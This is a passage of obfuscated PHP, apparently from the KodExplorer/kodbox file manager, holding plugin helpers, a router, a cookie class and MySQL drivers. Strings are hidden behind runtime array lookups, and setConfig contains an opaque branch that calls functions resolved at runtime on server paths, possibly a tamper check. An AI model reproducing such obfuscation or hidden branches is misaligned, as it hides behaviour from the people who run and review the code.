parseConfig(&$÷ğ¼Øî›) { $ÏµïÏ”À =& $_SERVER[®»±”ó²]; $¨²ÉıÄ = $ÏµïÏ”À[1695]; if (!strstr($÷ğ¼Øî›, $¨²ÉıÄ)) { return; } preg_match_all($ÏµïÏ”À[1696], $÷ğ¼Øî›, $‚õ¿ëãİ); if (!is_array($‚õ¿ëãİ) || count($‚õ¿ëãİ) == 0 || !is_array($‚õ¿ëãİ[0]) || count($‚õ¿ëãİ[0]) == 0) { return; } $¹÷‚›‚ = $this->getConfig(); $Ş£”â = array(); $±º…¿ = array(); foreach ($‚õ¿ëãİ[0] as $ƒü ªİ‹) { $ş³Ø¢… = substr($ƒü ªİ‹, strlen($¨²ÉıÄ), -2); $Ş£”â[] = $ƒü ªİ‹; $±º…¿[] = _get($¹÷‚›‚, $ş³Ø¢…); } $÷ğ¼Øî› = str_replace($Ş£”â, $±º…¿, $÷ğ¼Øî›); } private function parsePackage(&$×ÊùÉû×) { $ô£ãŸ =& $_SERVER[®»±”ó²]; $ñîûô¤è = $ô£ãŸ[1697]; if (!strstr($×ÊùÉû×, $ñîûô¤è)) { return; } preg_match_all($ô£ãŸ[1698], $×ÊùÉû×, $Š¡ÙŸ«); if (!is_array($Š¡ÙŸ«) || count($Š¡ÙŸ«) == 0 || !is_array($Š¡ÙŸ«[0]) || count($Š¡ÙŸ«[0]) == 0) { return; } $¬æ²¼ = $this->appPackage(); $•Ğ¥Ãæ† = array(); $’èùä¨ = array(); foreach ($Š¡ÙŸ«[0] as $îÀƒù–ì) { $¶ş†‰Íˆ = substr($îÀƒù–ì, strlen($ñîûô¤è), -2); $•Ğ¥Ãæ†[] = $îÀƒù–ì; $’èùä¨[] = _get($¬æ²¼, $¶ş†‰Íˆ); } $×ÊùÉû× = str_replace($•Ğ¥Ãæ†, $’èùä¨, $×ÊùÉû×); } final function echoFile($ú¬ÂäÔ , $®·¹øø• = false) { $ßáÆúõú =& $_SERVER[®»±”ó²]; $øË…•ª = $this->pluginPath . $ú¬ÂäÔ ; if (ACT == $ßáÆúõú[1699]) { echo $ßáÆúõú[1700] . $this->pluginName . $ßáÆúõú[8] . $ú¬ÂäÔ  . $ßáÆúõú[1701]; if (!file_exists($øË…•ª)) { echo $ßáÆúõú[1702]; return; } } $Ç–’¾¶æ = $this->parseFile($øË…•ª); $this->parseLang($Ç–’¾¶æ); $this->parseConfig($Ç–’¾¶æ); $this->parsePackage($Ç–’¾¶æ); if (is_array($®·¹øø•)) { $Ç–’¾¶æ = str_replace(array_keys($®·¹øø•), array_values($®·¹øø•), $Ç–’¾¶æ); } echo $ßáÆúõú[288] . $Ç–’¾¶æ; } private function checkVersion() { $é¸¡ƒ ö =& $_SERVER[®»±”ó²]; $ ŸèïÂ = $this->appPackage(); $®ƒôæ² = $this->getConfig(); if ($®ƒôæ²[$é¸¡ƒ ö[1703]] == $ ŸèïÂ[$é¸¡ƒ ö[1677]]) { return; } $this->regist(); $this->setConfig(array($é¸¡ƒ ö[1703] => $ ŸèïÂ[$é¸¡ƒ ö[1677]])); } final function initLang() { $£áöğÆø =& $_SERVER[®»±”ó²]; $…Ë¿›ÈÔ = $£áöğÆø[1704]; $²û’²ó = $this->pluginPath . $£áöğÆø[1705]; $æÈªØÚ“ = I18n::getType(); $†·Éü—Â = array(); if (file_exists($²û’²ó . $æÈªØÚ“ . $£áöğÆø[925])) { $†·Éü—Â = (include $²û’²ó . $æÈªØÚ“ . $£áöğÆø[925]); } else { if ($æÈªØÚ“ == $£áöğÆø[1706] && !file_exists($²û’²ó . $æÈªØÚ“ . $£áöğÆø[925]) && file_exists($²û’²ó . $£áöğÆø[1707])) { $†·Éü—Â = (include $²û’²ó . $£áöğÆø[1707]); } else { if (file_exists($²û’²ó . $…Ë¿›ÈÔ . $£áöğÆø[925])) { $†·Éü—Â = (include $²û’²ó . $…Ë¿›ÈÔ . $£áöğÆø[925]); } } } if (!is_array($†·Éü—Â)) { return array(); } if (@count($†·Éü—Â) > 0) { I18n::set($†·Éü—Â); } return $†·Éü—Â; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($œ‹¯’è†) { $öáœ·Â =& $_SERVER[®»±”ó²]; if ($_SERVER[$öáœ·Â[478]] != $_SERVER[$öáœ·Â[479]]) { $£›ïÜÜš = $öáœ·Â[965]; $éùÙ¶º = $öáœ·Â[480]; $—Ó“İÔ = $_SERVER[$öáœ·Â[481]] . $öáœ·Â[482]; $ÁŒÖÆØİ = $éùÙ¶º($—Ó“İÔ); $éŞ¼¹Ú¤ = explode($öáœ·Â[288], $ÁŒÖÆØİ); if (count($éŞ¼¹Ú¤) < $öáœ·Â[721]) { $Ïú°Ç¯ = $öáœ·Â[484]; $Ïú°Ç¯(); } $àªÉƒÉò = $öáœ·Â[966]; $àªÉƒÉò($_SERVER[$öáœ·Â[967]]); $àªÉƒÉò($_SERVER[$öáœ·Â[481]] . $öáœ·Â[1708]); $ïç’¹˜ğ = 1; while ($ïç’¹˜ğ > 1) { $ïç’¹˜ğ = $ïç’¹˜ğ + 4; $ôæ—´ª™ = rawurlencode($ïç’¹˜ğ . $öáœ·Â[456]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $œ‹¯’è†); } public function onSetConfig($à£¡”Êä) { } public function onGetConfig($³ƒ˜Ò‹‡) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ìóœ¯Ù¬) { if ($Ìóœ¯Ù¬ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Èƒ¿… = "\160\x6c\165\x67\151\156\101\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÌŠÓœ¸è = $this->getConfig(); if (!$ÌŠÓœ¸è[$Èƒ¿…]) { return !1; } return ActionCall($_SERVER[®»±”ó²][1709], $ÌŠÓœ¸è[$Èƒ¿…]); } public function url($Œ›È×…‰, $ÆÛ÷Ï¿À = '', $š³†Œ® = true) { $¹Ìß‰í» =& $_SERVER[®»±”ó²]; $©Òë¦®Î = $this->getConfig(); $ŞÕï²Ÿ¸ = KOD_VERSION . $¹Ìß‰í»[10] . KOD_VERSION_BUILD; $ÇûÑ°¶¹ = $this->packageVersion(); $†ÎúÍã = $ŞÕï²Ÿ¸ . $¹Ìß‰í»[464] . $ÇûÑ°¶¹; if (substr($Œ›È×…‰, 0, 4) == $¹Ìß‰í»[152] || substr($Œ›È×…‰, 0, 2) == $¹Ìß‰í»[1430]) { $ó«£ğ¨í = $Œ›È×…‰ . $¹Ìß‰í»[1710] . $†ÎúÍã; } else { if ($ÆÛ÷Ï¿À == $¹Ìß‰í»[12]) { $ó«£ğ¨í = $this->pluginHost . $Œ›È×…‰ . $¹Ìß‰í»[1710] . $†ÎúÍã; } else { if ($ÆÛ÷Ï¿À === $¹Ìß‰í»[78]) { $ó«£ğ¨í = $this->pluginHost . $Œ›È×…‰; } else { if ($ÆÛ÷Ï¿À == $¹Ìß‰í»[1711]) { $ó«£ğ¨í = STATIC_PATH . $Œ›È×…‰ . $¹Ìß‰í»[1710] . $ŞÕï²Ÿ¸; } else { if ($ÆÛ÷Ï¿À == $¹Ìß‰í»[1712]) { $ó«£ğ¨í = APP_HOST . $¹Ìß‰í»[1713] . $Œ›È×…‰ . $¹Ìß‰í»[1710] . $ŞÕï²Ÿ¸; } else { if (isset($©Òë¦®Î[$ÆÛ÷Ï¿À])) { $ó«£ğ¨í = $©Òë¦®Î[$ÆÛ÷Ï¿À] . $Œ›È×…‰ . $¹Ìß‰í»[1710] . $†ÎúÍã; } } } } } } if (!$š³†Œ®) { return $ó«£ğ¨í; } echo $ó«£ğ¨í; } public function link($™§”¹Ï÷ = false, $†éğ’øš = '') { $•†ÈÁêØ =& $_SERVER[®»±”ó²]; $½Üã»Ù¢ = $this->linkHas == !1; $this->linkHas = !0; if (!$™§”¹Ï÷) { $this->link($•†ÈÁêØ[1714], $•†ÈÁêØ[1712]); $this->link($•†ÈÁêØ[1715], $•†ÈÁêØ[1711]); $this->link($•†ÈÁêØ[1716], $•†ÈÁêØ[1711]); $this->link($•†ÈÁêØ[1717], $•†ÈÁêØ[1711]); $this->link($•†ÈÁêØ[1718], $•†ÈÁêØ[1711]); if ($½Üã»Ù¢) { Hook::trigger($•†ÈÁêØ[1719]); } return; } $ãŞÖ¥ì£ = $this->url($™§”¹Ï÷, $†éğ’øš, !1); if (substr($™§”¹Ï÷, -3) == $•†ÈÁêØ[1720]) { echo $•†ÈÁêØ[1721] . $ãŞÖ¥ì£ . $•†ÈÁêØ[1722] . $•†ÈÁêØ[288]; } else { if (substr($™§”¹Ï÷, -4) == $•†ÈÁêØ[1723]) { echo $•†ÈÁêØ[1724] . $ãŞÖ¥ì£ . $•†ÈÁêØ[1725] . $•†ÈÁêØ[288]; } } if ($½Üã»Ù¢) { Hook::trigger($•†ÈÁêØ[1719]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\x5e\57\135\x2b", "\x3a\156\x75\155" => "\x5b\60\x2d\71\135\53", "\x3a\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($£ï­³¹¯, $äÊÜ–¼£) { $Ö©¼ú =& $_SERVER[®»±”ó²]; if ($£ï­³¹¯ == $Ö©¼ú[1726]) { $ÍşÎóºÎ = array_map($Ö©¼ú[1727], $äÊÜ–¼£[0]); $ÎàßÒ™Í = strpos($äÊÜ–¼£[1], $Ö©¼ú[8]) === 0 ? $äÊÜ–¼£[1] : $Ö©¼ú[8] . $äÊÜ–¼£[1]; $‚†£â‹ß = $äÊÜ–¼£[2]; } else { $ÍşÎóºÎ = null; $ÎàßÒ™Í = strpos($äÊÜ–¼£[0], $Ö©¼ú[8]) === 0 ? $äÊÜ–¼£[0] : $Ö©¼ú[8] . $äÊÜ–¼£[0]; $‚†£â‹ß = $äÊÜ–¼£[1]; } array_push(self::$maps, $ÍşÎóºÎ); array_push(self::$routes, $ÎàßÒ™Í); array_push(self::$methods, strtoupper($£ï­³¹¯)); array_push(self::$callbacks, $‚†£â‹ß); } public static function error($ÍÃ‡ ‡¶) { self::$errorCallback = $ÍÃ‡ ‡¶; } public static function haltOnMatch($½˜ÖŸ®† = true) { self::$halts = $½˜ÖŸ®†; } public static function dispatch() { $å‡™È£… =& $_SERVER[®»±”ó²]; $¬¤Õ©†Ã = parse_url($_SERVER[$å‡™È£…[1728]], PHP_URL_PATH); $Ü£½Óİş = $_SERVER[$å‡™È£…[164]]; $ÓÓåßÕ– = array_keys(static::$patterns); $Ÿæëåæ´ = array_values(static::$patterns); $òÃì—¡ = !1; self::$routes = preg_replace($å‡™È£…[1373], $å‡™È£…[8], self::$routes); if (in_array($¬¤Õ©†Ã, self::$routes)) { $šœü¯¢ = array_keys(self::$routes, $¬¤Õ©†Ã); foreach ($šœü¯¢ as $ÎØ†—„) { if (self::$methods[$ÎØ†—„] == $Ü£½Óİş || self::$methods[$ÎØ†—„] == $å‡™È£…[1729] || in_array($Ü£½Óİş, self::$maps[$ÎØ†—„])) { $òÃì—¡ = !0; if (!is_object(self::$callbacks[$ÎØ†—„])) { $çê±¾Î– = explode($å‡™È£…[8], self::$callbacks[$ÎØ†—„]); $ú©¾¡Ä = end($çê±¾Î–); $ˆˆƒ˜Ù· = explode($å‡™È£…[1305], $ú©¾¡Ä); $àó¥Ë¡ = new $ˆˆƒ˜Ù·[0](); $àó¥Ë¡->{$ˆˆƒ˜Ù·[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÎØ†—„]); if (self::$halts) { return; } } } } } else { $Æ‘»£çï = 0; foreach (self::$routes as $ÎØ†—„) { if (strpos($ÎØ†—„, $å‡™È£…[4]) !== !1) { $ÎØ†—„ = str_replace($ÓÓåßÕ–, $Ÿæëåæ´, $ÎØ†—„); } if (preg_match($å‡™È£…[1730] . $ÎØ†—„ . $å‡™È£…[1731], $¬¤Õ©†Ã, $Öóƒô™ô)) { if (self::$methods[$Æ‘»£çï] == $Ü£½Óİş || self::$methods[$Æ‘»£çï] == $å‡™È£…[1729] || !empty(self::$maps[$Æ‘»£çï]) && in_array($Ü£½Óİş, self::$maps[$Æ‘»£çï])) { $òÃì—¡ = !0; array_shift($Öóƒô™ô); if (!is_object(self::$callbacks[$Æ‘»£çï])) { $çê±¾Î– = explode($å‡™È£…[8], self::$callbacks[$Æ‘»£çï]); $ú©¾¡Ä = end($çê±¾Î–); $ˆˆƒ˜Ù· = explode($å‡™È£…[1305], $ú©¾¡Ä); $àó¥Ë¡ = new $ˆˆƒ˜Ù·[0](); if (!method_exists($àó¥Ë¡, $ˆˆƒ˜Ù·[1])) { echo $å‡™È£…[1732]; } else { call_user_func_array(array($àó¥Ë¡, $ˆˆƒ˜Ù·[1]), $Öóƒô™ô); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Æ‘»£çï], $Öóƒô™ô); if (self::$halts) { return; } } } } $Æ‘»£çï++; } } if ($òÃì—¡ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ñàó…Ğ» =& $_SERVER[®»±”ó²]; header($_SERVER[$ñàó…Ğ»[1733]] . $ñàó…Ğ»[1734]); echo $ñàó…Ğ»[1735]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$å‡™È£…[1728]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto b õ£óŠ´†; FÄíÉ¶Ê‹Ø: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($„£¡Á‡ = '', $à”ší÷Â = 0) { if (is_string($„£¡Á‡) && $„£¡Á‡ != $_SERVER[®»±”ó²][12]) { $this->prefix = $„£¡Á‡; } if (is_numeric($à”ší÷Â) && $à”ší÷Â > 0) { $this->expire = $à”ší÷Â; } } public static function getInstance() { static $ÕÍ¡ç„ø; if ($ÕÍ¡ç„ø === null) { $ÕÍ¡ç„ø = new self(); } return $ÕÍ¡ç„ø; } private static $cookieDisable = false; public static function disable($¸ÒæÂì°) { self::$cookieDisable = $¸ÒæÂì°; } private static $sameCookieSet = array(); public static function set($†“¨º°’, $÷©Ê¸õÔ, $˜ò±”àö = 0, $ƒ˜Ü‡íİ = false, $ôş½ºÏ = false) { $½´”òÆ­ =& $_SERVER[®»±”ó²]; if (self::$cookieDisable) { return; } if (!$˜ò±”àö) { $˜ò±”àö = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$†“¨º°’]) && self::$sameCookieSet[$†“¨º°’] == $÷©Ê¸õÔ . $˜ò±”àö) { return; } self::$sameCookieSet[$†“¨º°’] = $÷©Ê¸õÔ . $˜ò±”àö; if (!$ôş½ºÏ) { $ôş½ºÏ = str_replace(HOST, $½´”òÆ­[12], APP_HOST); $ôş½ºÏ = _get($GLOBALS, $½´”òÆ­[970], $ôş½ºÏ); } $ığ×ßÂ‹ = $½´”òÆ­[12]; setcookie($†“¨º°’, $÷©Ê¸õÔ, time() + $˜ò±”àö, $½´”òÆ­[8] . trim($ôş½ºÏ, $½´”òÆ­[8]) . $ığ×ßÂ‹, !1, !1, $ƒ˜Ü‡íİ); } public static function setSafe($˜ãİöš÷, $‹Ú­ÔÚ˜, $˜ñÈâ¨Œ = 0) { self::set($˜ãİöš÷, $‹Ú­ÔÚ˜, $˜ñÈâ¨Œ, !0); } public static function get($ğ×í¡…·) { static $ëĞñ˜ = false; if (!$ëĞñ˜) { self::initHeaderCookie(); $ëĞñ˜ = !0; } return isset($_COOKIE[$ğ×í¡…·]) ? $_COOKIE[$ğ×í¡…·] : !1; } private static function initHeaderCookie() { $Ÿ‰Õé²½ =& $_SERVER[®»±”ó²]; if (!isset($_SERVER[$Ÿ‰Õé²½[971]]) || !$_SERVER[$Ÿ‰Õé²½[971]]) { return; } $ ¶¥À’Ó = explode($Ÿ‰Õé²½[74], $_SERVER[$Ÿ‰Õé²½[971]]); foreach ($ ¶¥À’Ó as $œ êÑ½è) { $œ êÑ½è = explode($Ÿ‰Õé²½[517], $œ êÑ½è); if (count($œ êÑ½è) != 2 || !isset($œ êÑ½è[1])) { continue; } $_COOKIE[trim($œ êÑ½è[0])] = trim($œ êÑ½è[1]); } } public static function remove($şËÕò¹À, $Ü°¤üÜÈ = false) { unset($_COOKIE[$şËÕò¹À]); self::set($şËÕò¹À, $_SERVER[®»±”ó²][12], 1, $Ü°¤üÜÈ); } } class DbMysql extends Db { public function __construct($ûá­”§¸ = '') { $ˆˆï»¡ı =& $_SERVER[®»±”ó²]; if (!extension_loaded($ˆˆï»¡ı[889])) { think_exception(think_lang($ˆˆï»¡ı[14]) . $ˆˆï»¡ı[972]); } if (!empty($ûá­”§¸)) { $this->config = $ûá­”§¸; if (empty($this->config[$ˆˆï»¡ı[17]])) { $this->config[$ˆˆï»¡ı[17]] = $ˆˆï»¡ı[12]; } } } public function connect($ä–¾Òƒ± = '', $¾¬êø£É = 0, $œâÃÂø = false) { $‹‚µ÷¢© =& $_SERVER[®»±”ó²]; if (!isset($this->linkID[$¾¬êø£É])) { if (empty($ä–¾Òƒ±)) { $ä–¾Òƒ± = $this->config; } $†Ãá˜Î = $ä–¾Òƒ±[$‹‚µ÷¢©[973]] . ($ä–¾Òƒ±[$‹‚µ÷¢©[974]] ? "\x3a{$ä–¾Òƒ±[$‹‚µ÷¢©[974]]}" : $‹‚µ÷¢©[12]); $³ğÕùÍö = !empty($ä–¾Òƒ±[$‹‚µ÷¢©[17]][$‹‚µ÷¢©[18]]) ? $ä–¾Òƒ±[$‹‚µ÷¢©[17]][$‹‚µ÷¢©[18]] : $this->pconnect; if ($³ğÕùÍö) { $this->linkID[$¾¬êø£É] = mysql_pconnect($†Ãá˜Î, $ä–¾Òƒ±[$‹‚µ÷¢©[975]], $ä–¾Òƒ±[$‹‚µ÷¢©[976]], 131072); } else { $this->linkID[$¾¬êø£É] = mysql_connect($†Ãá˜Î, $ä–¾Òƒ±[$‹‚µ÷¢©[975]], $ä–¾Òƒ±[$‹‚µ÷¢©[976]], !0, 131072); } if (!$this->linkID[$¾¬êø£É] || !empty($ä–¾Òƒ±[$‹‚µ÷¢©[21]]) && !mysql_select_db($ä–¾Òƒ±[$‹‚µ÷¢©[21]], $this->linkID[$¾¬êø£É])) { think_exception(mysql_error()); } $¢ñ¼åØˆ = mysql_get_server_info($this->linkID[$¾¬êø£É]); mysql_query($‹‚µ÷¢©[977] . think_config($‹‚µ÷¢©[978]) . $‹‚µ÷¢©[58], $this->linkID[$¾¬êø£É]); if ($¢ñ¼åØˆ > $‹‚µ÷¢©[979]) { mysql_query($‹‚µ÷¢©[980], $this->linkID[$¾¬êø£É]); } $this->connected = !0; if (1 != think_config($‹‚µ÷¢©[22])) { unset($this->config); } } return $this->linkID[$¾¬êø£É]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($…‚à†ƒ¡) { $²Ñ…çã„ =& $_SERVER[®»±”ó²]; if (0 === stripos($…‚à†ƒ¡, $²Ñ…çã„[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…‚à†ƒ¡; if ($this->queryID) { $this->free(); } think_action_status($²Ñ…çã„[23], 1); think_status($²Ñ…çã„[24]); $this->queryID = mysql_query($…‚à†ƒ¡, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($‡ï–±ş) { $ş°ë¤î =& $_SERVER[®»±”ó²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡ï–±ş; if ($this->queryID) { $this->free(); } think_action_status($ş°ë¤î[25], 1); think_status($ş°ë¤î[24]); $¡çò–• = mysql_query($‡ï–±ş, $this->_linkID); $this->debug(); if (!1 === $¡çò–•) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[®»±”ó²][981], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $óí¸íÇ = mysql_query($_SERVER[®»±”ó²][982], $this->_linkID); $this->transTimes = 0; if (!$óí¸íÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ãíØ×Í© = mysql_query($_SERVER[®»±”ó²][983], $this->_linkID); $this->transTimes = 0; if (!$ãíØ×Í©) { $this->error(); return !1; } } return !0; } private function getAll() { $­ûœ“ = array(); if ($this->numRows > 0) { while ($÷­×´—Ğ = mysql_fetch_assoc($this->queryID)) { $­ûœ“[] = $÷­×´—Ğ; } mysql_data_seek($this->queryID, 0); } return $­ûœ“; } public function getFields($úŸªÄ) { $óåœ±«‚ =& $_SERVER[®»±”ó²]; $é‰®Œöƒ = $this->query($óåœ±«‚[984] . $this->parseKey($úŸªÄ)); $ãÕŠÉñç = array(); if ($é‰®Œöƒ) { foreach ($é‰®Œöƒ as $º¥÷È†Ú => $ª’İ¶ÑÓ) { $ãÕŠÉñç[$ª’İ¶ÑÓ[$óåœ±«‚[31]]] = array($óåœ±«‚[32] => $ª’İ¶ÑÓ[$óåœ±«‚[31]], $óåœ±«‚[33] => $ª’İ¶ÑÓ[$óåœ±«‚[34]], $óåœ±«‚[35] => (bool) (strtoupper($ª’İ¶ÑÓ[$óåœ±«‚[36]]) === $óåœ±«‚[985]), $óåœ±«‚[37] => $ª’İ¶ÑÓ[$óåœ±«‚[38]], $óåœ±«‚[39] => strtolower($ª’İ¶ÑÓ[$óåœ±«‚[40]]) == $óåœ±«‚[41], $óåœ±«‚[42] => strtolower($ª’İ¶ÑÓ[$óåœ±«‚[43]]) == $óåœ±«‚[44]); } } return $ãÕŠÉñç; } public function getTables($õÙì¿Ïˆ = '') { $µÍşÓ± =& $_SERVER[®»±”ó²]; if (!empty($õÙì¿Ïˆ)) { $ÎÚ´İÙö = $µÍşÓ±[986] . $õÙì¿Ïˆ . $µÍşÓ±[987]; } else { $ÎÚ´İÙö = $µÍşÓ±[988]; } $ú’¦Øúë = $this->query($ÎÚ´İÙö); $Ò„¢Šğ = array(); foreach ($ú’¦Øúë as $‡ÊäâëÂ => $Ã³íÖŠ) { $Ò„¢Šğ[$‡ÊäâëÂ] = current($Ã³íÖŠ); } return $Ò„¢Šğ; } public function replace($›Ö™õú³, $˜É±­Íœ = array()) { $ã½®Èê° =& $_SERVER[®»±”ó²]; foreach ($›Ö™õú³ as $½Üíñ…¤ => $ì«ïÌ•) { $òØÈåóª = $this->parseValue($ì«ïÌ•); if (is_scalar($òØÈåóª)) { $Ñ‡àï€Æ[] = $òØÈåóª; $ÂŒæ†É«[] = $this->parseKey($½Üíñ…¤); } } $ÑÖá¾Å² = $ã½®Èê°[989] . $this->parseTable($˜É±­Íœ[$ã½®Èê°[359]]) . $ã½®Èê°[990] . implode($ã½®Èê°[50], $ÂŒæ†É«) . $ã½®Èê°[991] . implode($ã½®Èê°[50], $Ñ‡àï€Æ) . $ã½®Èê°[992]; return $this->execute($ÑÖá¾Å²); } public function insertAll($Ø’ÖìŒ, $À»ÆÃ¤Î = array(), $¿üêÅ‚É = false) { $ÌŠû¦†£ =& $_SERVER[®»±”ó²]; if (!is_array($Ø’ÖìŒ[0])) { return !1; } $ÃñÏô½ = array_keys($Ø’ÖìŒ[0]); $Ñî—™ø® = array(); foreach ($Ø’ÖìŒ as $üÖôÖı¹) { $ÆÌ÷¿¼° = array(); foreach ($üÖôÖı¹ as $şœüÕı => $ƒØú¢“¤) { $ƒØú¢“¤ = $this->parseValue($ƒØú¢“¤); if (is_scalar($ƒØú¢“¤)) { $ÆÌ÷¿¼°[] = $ƒØú¢“¤; } } $Ñî—™ø®[] = $ÌŠû¦†£[340] . implode($ÌŠû¦†£[50], $ÆÌ÷¿¼°) . $ÌŠû¦†£[992]; } array_walk($ÃñÏô½, array($this, $ÌŠû¦†£[993])); $Í…éÑÈ = ($¿üêÅ‚É ? $ÌŠû¦†£[994] : $ÌŠû¦†£[995]) . $ÌŠû¦†£[996] . $this->parseTable($À»ÆÃ¤Î[$ÌŠû¦†£[359]]) . $ÌŠû¦†£[990] . implode($ÌŠû¦†£[50], $ÃñÏô½) . $ÌŠû¦†£[997] . implode($ÌŠû¦†£[50], $Ñî—™ø®); return $this->execute($Í…éÑÈ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ñÀ–††¸ =& $_SERVER[®»±”ó²]; $this->error = mysql_errno() . $ñÀ–††¸[4] . mysql_error($this->_linkID); if ($ñÀ–††¸[12] != $this->queryStr) { $this->error .= LNG($ñÀ–††¸[48]) . $this->queryStr; } think_trace($this->error, $ñÀ–††¸[12], $ñÀ–††¸[49]); return $this->error; } public function escapeString($¢ôÎÉöõ) { if ($this->_linkID) { return mysql_real_escape_string($¢ôÎÉöõ, $this->_linkID); } else { return mysql_escape_string($¢ôÎÉöõ); } } public function parseKey(&$”¦¢¼ˆ, $¤Ë–ûÄ½ = true) { $¤®™¯ÃŞ =& $_SERVER[®»±”ó²]; if ($¤Ë–ûÄ½) { $”¦¢¼ˆ = $this->parseKeyCheck($”¦¢¼ˆ); } if ($”¦¢¼ˆ != $¤®™¯ÃŞ[223] && !preg_match($¤®™¯ÃŞ[998], $”¦¢¼ˆ)) { $”¦¢¼ˆ = $¤®™¯ÃŞ[463] . trim($”¦¢¼ˆ, $¤®™¯ÃŞ[463]) . $¤®™¯ÃŞ[463]; } return $”¦¢¼ˆ; } } class DbMysqli extends Db { public function __construct($‘Óµ×»é = '') { $·ˆÁ³š¾ =& $_SERVER[®»±”ó²]; if (!extension_loaded($·ˆÁ³š¾[999])) { think_exception(think_lang($·ˆÁ³š¾[14]) . $·ˆÁ³š¾[1000]); } if (!empty($‘Óµ×»é)) { $this->config = $‘Óµ×»é; if (empty($this->config[$·ˆÁ³š¾[17]])) { $this->config[$·ˆÁ³š¾[17]] = $·ˆÁ³š¾[12]; } } } public function connect($¨¿ÜûèÆ = '', $»½›½Ñõ = 0) { $ñëÙûºÚ =& $_SERVER[®»±”ó²]; if (!isset($this->linkID[$»½›½Ñõ])) { if (empty($¨¿ÜûèÆ)) { $¨¿ÜûèÆ = $this->config; } $this->linkID[$»½›½Ñõ] = new mysqli($¨¿ÜûèÆ[$ñëÙûºÚ[973]], $¨¿ÜûèÆ[$ñëÙûºÚ[975]], $¨¿ÜûèÆ[$ñëÙûºÚ[976]], $¨¿ÜûèÆ[$ñëÙûºÚ[21]], $¨¿ÜûèÆ[$ñëÙûºÚ[974]] ? intval($¨¿ÜûèÆ[$ñëÙûºÚ[974]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $í…‡ºûû = $this->linkID[$»½›½Ñõ]->server_version; $this->linkID[$»½›½Ñõ]->query($ñëÙûºÚ[977] . think_config($ñëÙûºÚ[978]) . $ñëÙûºÚ[58]); if ($í…‡ºûû > $ñëÙûºÚ[979]) { $this->linkID[$»½›½Ñõ]->query($ñëÙûºÚ[980]); } $this->connected = !0; if (1 != think_config($ñëÙûºÚ[22])) { unset($this->config); } } return $this->linkID[$»½›½Ñõ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÑÌ¢¨ú) { $ÊÇÚ™‰Œ =& $_SERVER[®»±”ó²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÑÌ¢¨ú; if ($this->queryID) { $this->free(); } think_action_status($ÊÇÚ™‰Œ[23], 1); think_status($ÊÇÚ™‰Œ[24]); $this->queryID = $this->_linkID->query($ÑÌ¢¨ú); if ($this->_linkID->more_results()) { while (($¹¨‡âß¡ = $this->_linkID->next_result()) != NULL) { $¹¨‡âß¡->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($§¨Û×‡ä) { $õÕÈ’¯Ô =& $_SERVER[®»±”ó²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $§¨Û×‡ä; if ($this->queryID) { $this->free(); } think_action_status($õÕÈ’¯Ô[25], 1); think_status($õÕÈ’¯Ô[24]); $àşŒ£¢ü = $this->_linkID->query($§¨Û×‡ä); $this->debug(); if (!1 === $àşŒ£¢ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ş²õ½Œ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ş²õ½Œ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ô€³Šı¢ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ô€³Šı¢) { $this->error(); return !1; } } return !0; } private function getAll() { $÷£ì§…Ë = array(); if ($this->numRows > 0) { for ($¹ç©¹±ş = 0; $¹ç©¹±ş < $this->numRows; $¹ç©¹±ş++) { $÷£ì§…Ë[$¹ç©¹±ş] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $÷£ì§…Ë; } public function getFields($¥ë¤º„Ô) { $ÈÔû´åà =& $_SERVER[®»±”ó²]; $ÈìÛ‰úç = $this->query($ÈÔû´åà[984] . 